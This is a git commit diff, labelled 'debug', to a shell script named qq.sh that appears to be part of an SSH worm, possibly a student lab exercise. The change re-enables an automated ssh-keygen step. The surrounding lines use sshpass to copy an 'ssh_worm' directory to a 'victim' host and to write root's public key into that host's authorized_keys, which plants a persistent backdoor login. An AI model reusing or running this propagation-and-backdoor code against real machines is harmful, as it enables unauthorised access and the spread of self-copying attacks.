e86e47f3d243e7c965d79ebb3e13ae16946d5c82
SongYun <william0228.cs05@g2.nctu.edu.tw>
2019-05-01 20:34:13 +0800

    debug

--- qq.sh
+++ qq.sh
@@ -10,26 +10,23 @@ sshpass -e scp -r /home/victim/Desktop/ssh_worm victim@"$IP_Address":/home/victi
 # publickey
 SSH_PATH="/home/victim/.ssh"
 
-echo "$1"
-
-#if ["$1" = "y"]
-#then
-#	(
-#	echo "\r"
-#	echo "\r"
-#	sleep 1
-#	echo "\r"
-#	sleep 1
-#	echo "\r"
-#	)|ssh-keygen
-#else 
-#	(
-#	echo "\r"
-#	sleep 1
-#	echo "n\r"
-#	sleep 1
-#	)|ssh-keygen
-#fi
+if ["$1" = "y"]
+then
+	(
+	echo "\r"
+	sleep 1
+	echo "\r"
+	sleep 1
+	echo "\r"
+	)|ssh-keygen
+else 
+	(
+	echo "\r"
+	sleep 1
+	echo "n\r"
+	sleep 1
+	)|ssh-keygen
+fi
 
 sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
 sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys
